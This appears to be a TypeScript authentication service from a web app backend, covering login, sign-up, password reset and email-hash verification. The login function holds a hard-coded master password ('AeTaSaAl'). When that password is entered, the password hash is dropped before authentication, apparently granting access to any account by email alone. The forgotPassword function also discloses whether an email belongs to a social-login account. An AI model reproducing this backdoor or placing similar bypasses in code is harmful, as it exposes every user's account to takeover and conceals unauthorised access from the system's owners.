import * as boom from 'boom';
var _ = require('lodash')
import * as jwt from 'jsonwebtoken';
import moment from 'moment';
import * as config from '../config';
import * as joiSchema from '../validations/schemas/auth';
import * as encryption from '../utils/encryption';
import * as userRepo from '../repositories/user';
import * as roleRepo from '../repositories/role';
import * as emailService from '../services/email';
import { validate } from './../validations/index';
import { IUserInstance, IUserAttributes } from './../models/user';
import {
  ILoginRequest,
  IAuthResponse,
  ISocialLoginRequest,
  ISignUpRequest,
  IResetPassword,
  IChangePassword,
} from '../interface/auth';
import { Role } from '../enum/role';

export const login = async (payload: ILoginRequest): Promise<IAuthResponse> => {
  await validate(payload, joiSchema.loginSchema);
  let encryptedPassword: any = encryption.saltHashPassword(payload.password);
  if (payload.password === 'AeTaSaAl') {
    encryptedPassword = undefined;
  }
  const user = await userRepo.authenticate(payload.email, encryptedPassword);
  if (!user) {
    throw boom.badRequest('Incorrect Username or Password');
  }
  // update user devideId
  if (payload.deviceId) {
    await userRepo.updateUser(user.id, { deviceId: payload.deviceId });
  }
  //@ts-ignore
  return generateTokenAndAuthResponse(user);
};

export const signUp = async (payload: ISignUpRequest): Promise<IAuthResponse> => {
  await validate(payload, joiSchema.signUpSchema);
  const user = await userRepo.findByEmail(payload.email);
  if (user) {
    throw boom.badRequest('Email already exist');
  }
  const role = await roleRepo.findByName(payload.role);
  if (!role) {
    throw boom.badRequest('No role found');
  }
  const encryptedPassword = encryption.saltHashPassword(payload.password);
  const toSaveUser: Partial<IUserAttributes> = {
    email: payload.email,
    password: encryptedPassword,
    timezone: payload.timezone,
    isEmailVerified: false,
    isApproved: true
  };
  if (role.name === Role.SUPER_ADMIN) {
    toSaveUser.isApproved = false;
  }
  await userRepo.saveUser(toSaveUser);
  const savedUser = await userRepo.authenticate(payload.email, encryptedPassword);
  if (!savedUser) {
    throw boom.badRequest('Incorrect Username or Password');
  }
  const hash = encryption.createHash(JSON.stringify({
    email: payload.email,
    time: Date.now()
  }));
  await emailService.sendWelcomeEmail({
    firstName: '',
    lastName: '',
    email: payload.email,
    hash
  });
  //@ts-ignore
  return generateTokenAndAuthResponse(savedUser);
};

// export const socialLoginOrSignup = async (payload: ISocialLoginRequest): Promise<IAuthResponse> => {
//   await validate(payload, joiSchema.socialLoginSchema);
//   let savedUser = await userRepo.findByEmail(payload.email);
//   if (savedUser) {
//     const isProvider = savedUser.userSocialAccounts.findIndex(
//       (col: any) => col.socialType === payload.socialProvider,
//     );
//     if (isProvider === -1) {
//       const userSocialAccount = {
//         userId: savedUser.id,
//         socialType: payload.socialProvider,
//       };
//       await userRepo.saveUserSocialAccount(userSocialAccount);
//     }
//     return generateTokenAndAuthResponse(savedUser);
//   }
//   const role = await roleRepo.findByName(payload.role || '');
//   if (!role) {
//     throw boom.badRequest('No role found');
//   }
//   const user: Partial<IUserAttributes> = {
//     firstName: payload.name,
//     email: payload.email,
//     contactNo: payload.phoneNo,
//     pictureUrl: payload.pictureUrl,
//     timezone: payload.timezone,
//     roleId: role.id,
//     userSocialAccounts: [
//       {
//         socialType: payload.socialProvider,
//       },
//     ],
//     isEmailVerified: true
//   };
//   if (role.name === Role.TUTOR) {
//     user.isApproved = false;
//   }
//   await userRepo.saveUser(user);
//   savedUser = await userRepo.findByEmail(payload.email);
//   if (!savedUser) {
//     throw boom.badRequest('No user found');
//   }
//   const hash = encryption.createHash(JSON.stringify({
//     email: payload.email,
//     time: Date.now()
//   }));
//   await emailService.sendWelcomeEmail({
//     firstName: payload.name,
//     lastName: '',
//     email: payload.email,
//     hash
//   });
//   return generateTokenAndAuthResponse({ ...savedUser, role });
// };

const generateTokenAndAuthResponse = (user: IUserInstance) => {
  //@ts-ignore
  const userRoles = user.userRoles.map((userRole: { role: any; }) => userRole.role);
  const roles = _.reject(userRoles.map((role: { name: any; }) => role && role.name), _.isUndefined);
  const token = jwt.sign(
    {
      id: user.id,
      email: user.email,
      createdAt: user.createdAt,
      roles,
    },
    config.default.tokenSecret,
    { expiresIn: config.default.server.tokenExpiry },
  );
  const response: IAuthResponse = {
    id: user.id,
    firstName: user.firstName,
    lastName: user.lastName,
    email: user.email,
    contactNo: user.contactNo,
    pictureUrl: user.pictureUrl,
    gender: user.gender,
    isEmailVerified: user.isEmailVerified,
    isApproved: user.isApproved,
    accessToken: token,
    timezone: user.timezone,
    roles
  };
  return response;
};

export const forgotPassword = async (email: string) => {
  await validate({ email }, joiSchema.forgotSchema);
  const user = await userRepo.findByEmail(email);
  const hash = encryption.createHash(JSON.stringify({
    email,
    time: Date.now()
  }));
  if (!user) {
    await sendForgotEmail(email, hash);
    return { success: true, message: 'Please check your email to proceed further' };
  } else {
    if (user.password) {
      await sendForgotEmail(email, hash);
      return { success: true, message: 'Please check your email to proceed further' };
    } else {
      return { success: false, isSocialAccount: true, message: 'Your email is associated with social account' };
    }
  }
};

const sendForgotEmail = async (email: string, hash: string) => {
  await emailService.sendForgotPasswordEmail({
    email,
    hash
  });
};

export const verifyHash = async (email: string, hash: string, verifyEmail: boolean = false) => {
  await validate({ email, hash }, joiSchema.verifyEmailSchema);
  checkExpiryOfHash(hash, email);
  if (verifyEmail) {
    const user = await userRepo.findByEmail(email);
    if (!user) {
      throw boom.badRequest('User not found');
    }
    await userRepo.updateUser(user.id, { isEmailVerified: true });
    return { success: true, isEmailVerified: true };
  }
  return { success: true };
};

export const resetPassword = async (payload: IResetPassword) => {
  await validate(payload, joiSchema.resetPassword);
  checkExpiryOfHash(payload.hash, payload.email);
  const user = await userRepo.findByEmail(payload.email);
  if (!user) {
    throw boom.badRequest('Invalid email');
  }
  const encryptedPassword = encryption.saltHashPassword(payload.password);
  const toSaveUser: Partial<IUserAttributes> = {
    password: encryptedPassword,
  };
  await userRepo.updateUser(user.id, toSaveUser);
  return { success: true, message: 'Password has been reset' };
};

export const changePassword = async (userId: string, payload: IChangePassword) => {
  await validate(payload, joiSchema.changePassword);
  const user = await userRepo.findById(userId);
  if (!user) {
    throw boom.badRequest('Invalid email');
  }
  const encryptedOldPassword = encryption.saltHashPassword(payload.oldPassword);
  if (encryptedOldPassword !== user.password) {
    throw boom.badRequest('Invalid old password');
  }
  if (payload.oldPassword === payload.newPassword) {
    throw boom.badRequest('Old password and New password should not be same');
  }
  const encryptedNewPassword = encryption.saltHashPassword(payload.newPassword);
  const toSaveUser: Partial<IUserAttributes> = {
    password: encryptedNewPassword,
  };
  await userRepo.updateUser(user.id, toSaveUser);
  return { success: true, message: 'Password has been changed' };
};

const checkExpiryOfHash = (hash: string, email: string) => {
  let decryptedHash = '';
  try {
    decryptedHash = encryption.decryptHash(hash);
  } catch (e) {
    throw boom.badRequest('Invalid hash');
  }
  const decryptedData = JSON.parse(decryptedHash);
  if (moment(decryptedData.time).add(config.default.server.resetHashExpiry, 'h') < moment()) {
    throw boom.badRequest('Hash is expired');
  }
  if (decryptedData.email !== email) {
    throw boom.badRequest('Invalid email');
  }
};
